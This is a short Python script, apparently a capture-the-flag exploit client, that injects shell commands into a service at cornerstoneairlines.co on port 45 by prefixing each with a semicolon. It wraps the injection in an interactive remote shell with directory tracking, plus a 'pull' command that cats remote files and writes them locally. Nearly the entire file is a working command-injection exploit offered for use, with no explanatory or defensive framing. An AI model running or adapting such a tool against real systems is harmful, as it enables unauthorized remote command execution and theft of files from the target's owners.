from socket import socket
from time import sleep

cur_dir = [] # so execute can see it


def execute_command(comm):
    global cur_dir
    host = "cornerstoneairlines.co"
    port = 45

    s = socket()
    s.connect ((host, port))
    s.recv(1024) # get rid of garbage hello message
    string = "; cd "+ _cwd_to_string() +"; "+comm+"\n"
    s.send(str.encode(string)) # send our command
    result = s.recv(1024)

    return result

help_str = '''
shell: Drop into an interactive shell and allow users to gracefully exit.
pull <remote-path> <local-path>: Download files.
help: Show this menu.
quit: Quit the shell.
'''

def pull(remote, local):
    ret_bytes=execute_command('cat '+remote).decode()[:-1]
    with open(local, 'w') as local_file:
        local_file.write(ret_bytes)
    

def _cwd_to_string(directory=None):
    global cur_dir
    if not directory:
        directory = cur_dir # this is what i get for doing janky python code
    return '/'+'/'.join(directory)

def launch_shell():
    global cur_dir
    usr_input = 'not exit' # placeholder
    while usr_input != 'exit':
        usr_input = input(_cwd_to_string() + "> ").strip()
        if 'cd' in usr_input:
            args = usr_input.split(' ')
            if len(args) != 2:
                print('invalid cd')
                continue

            target_dir = args[1]
            if target_dir[0] == '/':
                # new path
                new_dir = []
                target_dir = target_dir[1:]
            else:
                new_dir = cur_dir[:]
                # alter path
                
            paths = target_dir.split('/')
            for path in paths:
                if path == '.':
                    continue
                elif path =='..':
                    if new_dir:
                        new_dir.pop()
                else:
                    new_dir.append(path)    
            # have generated new directory, test
            test_command = 'if [ -d %s ]; then echo "found"; fi' % (_cwd_to_string(new_dir),)
            isfound = execute_command(test_command).decode().strip()
            if isfound == 'found':
                cur_dir = new_dir
            else:
                print('invalid path %s' % (_cwd_to_string(new_dir),))
        elif usr_input != 'exit':
            print(execute_command(usr_input).decode()[:-1])


def start_interactive():
    usr_input = ['not quit'] #placeholder
    valid_commands = frozenset(['shell','pull','help','quit'])
    while usr_input[0] != 'quit':
        usr_input = input("interactive> ").strip().split(' ')

        if usr_input[0] not in valid_commands:
            print (help_str)
            continue

        elif usr_input[0] == "shell":
            print('launching shell!')
            launch_shell()

        elif usr_input[0] == "pull":
            if len(usr_input) != 3:
                print (help_str)
                continue
            _, remote, local = usr_input
            pull(remote, local)

        elif usr_input[0] == 'help':
            print(help_str)

        #quit works automatically
        


if __name__ == '__main__':
    start_interactive()
